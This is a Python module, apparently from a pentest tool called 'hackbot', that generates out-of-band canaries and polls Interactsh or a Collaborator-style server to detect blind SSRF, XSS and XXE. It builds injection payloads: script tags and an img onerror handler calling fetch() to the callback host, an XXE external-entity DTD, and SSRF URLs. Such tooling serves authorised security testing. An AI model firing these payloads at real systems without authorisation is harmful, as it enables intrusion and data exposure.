"""Out-of-band / blind canary helpers for SSRF, XSS, XXE.

Modes:
  1) Real Interactsh — HACKBOT_INTERACTSH=1 or HACKBOT_INTERACTSH_SERVER
  2) Legacy Collaborator-style — HACKBOT_OOB_BASE (+ optional POLL_URL / AUTH)
Without either, mints local unique markers for reflection checks only.
"""

from __future__ import annotations

import os
import secrets
import time
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import urlparse


def oob_configured() -> bool:
    if (os.environ.get("HACKBOT_OOB_BASE") or "").strip():
        return True
    try:
        from .interactsh_client import interactsh_enabled

        return interactsh_enabled()
    except Exception:  # noqa: BLE001
        return False


def mint_canary(*, kind: str = "ssrf", tag: str = "", prefer_interactsh: bool = True) -> dict[str, Any]:
    """Create a unique canary id + payloads for injection."""
    if prefer_interactsh:
        try:
            from .interactsh_client import interactsh_enabled, mint_interactsh_canary

            if interactsh_enabled():
                c = mint_interactsh_canary(kind=kind)
                if c.get("ok"):
                    if tag:
                        c["label"] = f"{c.get('label')}-{tag[:12]}"
                    return c
        except Exception:  # noqa: BLE001
            pass

    token = secrets.token_hex(6)
    stamp = int(time.time())
    base = (os.environ.get("HACKBOT_OOB_BASE") or "").strip().rstrip("/")
    label = f"hb-{kind}-{token}"
    if tag:
        label = f"{label}-{tag[:12]}"

    http_url = ""
    dns_host = ""
    if base:
        parsed = urlparse(base if "://" in base else f"https://{base}")
        host = parsed.hostname or base.replace("https://", "").replace("http://", "")
        dns_host = f"{label}.{host}" if not host.startswith(label) else host
        scheme = parsed.scheme or "https"
        http_url = f"{scheme}://{dns_host}/{stamp}"
    else:
        dns_host = f"{label}.oob.invalid"
        http_url = f"http://{dns_host}/{stamp}"

    xss_marker = f"hackbot_oob_{token}"
    xxe_dtd = (
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_url}">]><foo>&xxe;</foo>'
        if base or prefer_interactsh
        else ""
    )
    return {
        "ok": True,
        "kind": kind,
        "token": token,
        "label": label,
        "oob_configured": bool(base),
        "mode": "legacy_oob" if base else "local_marker",
        "http_url": http_url,
        "dns_host": dns_host,
        "xss_marker": xss_marker,
        "ssrf_payloads": [http_url, f"http://{dns_host}/", f"https://{dns_host}/"],
        "xss_payloads": [
            f"<script>fetch('{http_url}')</script>" if base else f"<script>{xss_marker}</script>",
            f'"><img src=x onerror=fetch("{http_url}")>' if base else f"'{xss_marker}",
        ],
        "xxe_payloads": [xxe_dtd] if xxe_dtd else [],
        "hint": (
            "Inject payloads, then poll OOB / Interactsh for hits."
            if base
            else "Set HACKBOT_INTERACTSH=1 or HACKBOT_OOB_BASE for true blind/OOB detection."
        ),
    }


def _auth_headers() -> dict[str, str]:
    headers = {"User-Agent": "hackbot-oob-poll"}
    auth = (os.environ.get("HACKBOT_OOB_AUTH") or os.environ.get("HACKBOT_INTERACTSH_TOKEN") or "").strip()
    if auth:
        headers["Authorization"] = auth if " " in auth else f"Bearer {auth}"
    return headers


def poll_oob(canary: dict[str, Any], *, timeout: float = 8.0) -> dict[str, Any]:
    """Poll Interactsh session or legacy HACKBOT_OOB_POLL_URL (always attaches AUTH if set)."""
    mode = str(canary.get("mode") or "")
    if mode == "interactsh" or canary.get("correlation_id"):
        try:
            from .interactsh_client import interactsh_poll

            return interactsh_poll(canary, wait=False)
        except Exception as exc:  # noqa: BLE001
            return {"ok": False, "polled": False, "hits": [], "error": f"{type(exc).__name__}: {exc}"}

    poll = (os.environ.get("HACKBOT_OOB_POLL_URL") or "").strip()
    if not poll:
        return {
            "ok": True,
            "polled": False,
            "hits": [],
            "hint": "Set HACKBOT_OOB_POLL_URL or use HACKBOT_INTERACTSH=1.",
            "token": canary.get("token"),
        }
    try:
        url = poll
        if "TOKEN" in poll:
            url = poll.replace("TOKEN", str(canary.get("token") or ""))
        req = urllib.request.Request(url, headers=_auth_headers())
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(20_000).decode("utf-8", errors="replace")
        hits = []
        token = str(canary.get("token") or "")
        if token and token in body:
            hits.append({"matched": token, "preview": body[:200]})
        return {"ok": True, "polled": True, "hits": hits, "raw_len": len(body), "signal": bool(hits)}
    except Exception as exc:  # noqa: BLE001
        return {"ok": False, "polled": True, "error": f"{type(exc).__name__}: {exc}", "hits": []}


def wait_and_poll(
    canary: dict[str, Any],
    *,
    rounds: int = 3,
    delay_sec: float = 2.0,
    timeout: float = 8.0,
) -> dict[str, Any]:
    """Wait/poll loop for OOB hits (capped rounds)."""
    if str(canary.get("mode") or "") == "interactsh" or canary.get("correlation_id"):
        try:
            from .interactsh_client import interactsh_poll

            return interactsh_poll(canary, wait=True)
        except Exception as exc:  # noqa: BLE001
            return {"ok": False, "rounds": 0, "hits": [], "signal": False, "error": str(exc)}

    hits: list[dict[str, Any]] = []
    last: dict[str, Any] = {}
    for i in range(max(1, min(rounds, 5))):
        if i:
            time.sleep(max(0.5, min(delay_sec, 10.0)))
        last = poll_oob(canary, timeout=timeout)
        if last.get("hits"):
            hits.extend(last["hits"])
        if last.get("signal"):
            break
    return {
        "ok": True,
        "rounds": rounds,
        "hits": hits,
        "signal": bool(hits) or bool(last.get("signal")),
        "last": last,
    }


def enrich_ssrf_payloads(
    existing: list[tuple[str, tuple[str, ...]]],
    *,
    canary: dict[str, Any] | None = None,
) -> list[tuple[str, tuple[str, ...]]]:
    """Append OOB SSRF payloads when configured (reuse canary so poll matches inject)."""
    if not oob_configured():
        return existing
    c = canary or mint_canary(kind="ssrf")
    extra = [(p, (c["token"], c["label"], "oob")) for p in c.get("ssrf_payloads", [])[:2]]
    return list(existing) + extra


def persist_last_canary(target_dir: Any, canary: dict[str, Any]) -> None:
    """Write hunt/last_canary.json for later oob_poll acts."""
    from pathlib import Path

    path = Path(target_dir) / "hunt" / "last_canary.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    # Never persist private key material here
    safe = {
        k: v
        for k, v in canary.items()
        if k
        not in {
            "private_key_pem",
            "secret_key",
        }
    }
    path.write_text(__import__("json").dumps(safe, indent=2), encoding="utf-8")
